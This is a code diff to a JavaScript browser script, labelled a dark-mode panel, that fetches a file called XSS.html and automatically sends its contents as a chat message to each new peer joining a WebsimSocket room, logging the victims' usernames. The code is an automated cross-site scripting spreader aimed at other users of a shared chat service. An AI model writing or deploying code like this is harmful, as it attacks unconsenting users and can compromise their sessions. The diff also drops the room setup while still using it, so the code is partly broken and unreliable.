@@ -1,3 +1,4 @@
+
 function createDarkModePanel() {
   // Check if the panel already exists
   if (document.getElementById("darkModePanel")) {
@@ -540,26 +541,23 @@ function createDarkModePanel() {
           throw new Error(`Failed to fetch XSS.html: ${response.statusText}`);
         }
 
-        const contentsOfXSS = await response.text();
-
-        // Use room.peers and send the contents to the new client
-        const room = new WebsimSocket();
-        room.initialize();
-
+        const contentsOfXSS = await response.text();  
+        const currentPeers = room.peers || {};
         setInterval(() => {
-          const currentPeers = room.peers || {};
 
           // Check if a new peer has joined
           for (const peerId in currentPeers) {
             if (!previousPeers[peerId]) {
               // A new peer has joined
               if (autoSendCheckbox.checked) {
+                setTimeout(() => {
                 room.send({
                   type: "chat",
                   message: contentsOfXSS,
                   section: "chicken"
                 });
-                console.log(`Sent contents of XSS.html to new peer: ${peerId}`);
+                logMessage(`Sent contents of XSS.html to new peer: ${room.peers[peerId].username}`);
+              }, 1000); // Delay before sending
               }
             }
           }
